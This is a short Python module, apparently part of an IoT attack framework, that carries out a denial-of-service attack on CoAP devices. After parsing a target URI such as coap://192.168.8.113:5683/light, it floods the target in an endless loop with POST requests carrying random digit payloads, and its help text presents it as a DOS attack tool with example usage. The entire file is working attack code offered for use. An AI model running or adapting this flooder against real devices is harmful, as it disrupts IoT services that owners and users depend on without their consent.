import socket
import sys
import random
import string
import argparse

from coapthon.client.helperclient import HelperClient
from coapthon.utils import parse_uri

client = None

def parse_args(args):
    parser = argparse.ArgumentParser(prog="frame.py coap_random_payload_dos",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     description="This module executes a random payload DOS program.",
                                     epilog="""Example usage:

    frame.py oap_random_payload_dos -path coap://192.168.8.113:5683/light -paylen 1""")
    parser.add_argument("-path","--path",help="Path must be like this:coap://192.168.8.113:5683/light",type=str)
    parser.add_argument("-paylen", "--payloadlen",
                        help="Payload length to be sent random DOS attck to the server (-paylen 1)", type=int)

    args = parser.parse_args(args)
    return args

def client_callback(response):
    print("Callback")

def coap_random(args):  # pragma: no cover
    global client
    op = "POST"

    if args.path is None:
        print("Path must be specified")
        sys.exit(2)

    if not args.path.startswith("coap://"):
        print("Path must be conform to coap://host[:port]/path")
        sys.exit(2)

    host, port, args.path = parse_uri(args.path)
    try:
        tmp = socket.gethostbyname(host)
        host = tmp
    except socket.gaierror:
        pass
    client = HelperClient(server=(host, port))

    if op == "POST":
        if args.path is None:
            print("Path cannot be empty for a POST request")
            sys.exit(2)

        while True:
            payload = ''.join((random.choice(string.digits) for i in range(args.payloadlen)))
            response = client.post(args.path, payload)
            print("Random payload is :" ,payload)
            print(response.pretty_print())
            #client.stop()
    else:
        print("Operation not recognized")
        sys.exit(2)

def module_main(args):
    args = parse_args(args)
    coap_random(args)
